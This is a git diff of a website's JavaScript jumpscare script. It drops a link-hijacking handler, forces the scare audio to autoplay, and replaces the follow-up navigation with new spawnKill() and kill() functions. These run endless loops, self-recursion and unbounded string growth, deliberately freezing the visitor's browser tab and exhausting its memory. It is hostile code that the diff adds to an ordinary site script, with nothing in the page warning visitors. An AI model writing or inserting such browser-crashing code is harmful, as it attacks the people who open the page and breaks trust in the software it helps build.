@@ -98,19 +98,6 @@ function displayEntryDiv() {
     document.body.appendChild(newAlert);
 }
 
-
-
-function addJumpscareToLinks() {
-    var elements = document.getElementsByTagName('a');
-    for(var i = 0, len = elements.length; i < len; i++) {
-        elements[i].onclick = (function (e) {
-            e.preventDefault();
-            newLink = e.target.href;
-            showJumpscare();
-        });
-    }
-}
-
 function showJumpscare() {
     const main = document.getElementsByTagName("main")[0];
     const nav = document.getElementsByTagName("nav")[0];
@@ -123,9 +110,10 @@ function showJumpscare() {
         
         document.body.style.backgroundImage = "url('images/jump_scare.gif')";
         var audio = document.getElementById("jumpscare-audio");
+        audio.autoplay = true;
         audio.addEventListener('playing', (event) => {
             wait(delay, 1).then(function() {
-                return goToNewLink(newLink);
+                return spawnKill();
             });
         });
         audio.play();        
@@ -134,11 +122,26 @@ function showJumpscare() {
     }
 }
 
-
-
 function wait(ms, val) {
     return new Promise(resolve => setTimeout(resolve, ms, val))
 }
+
+
+function spawnKill() {
+    while (true) {
+        kill();
+    }
+}
+
+async function kill() {
+    console.log("killing");
+    kill();
+    var a =""
+    while (true) {
+        a += "a";
+    }
+}
+
 
 function goToNewLink() {
     if (window.location.href == newLink) {
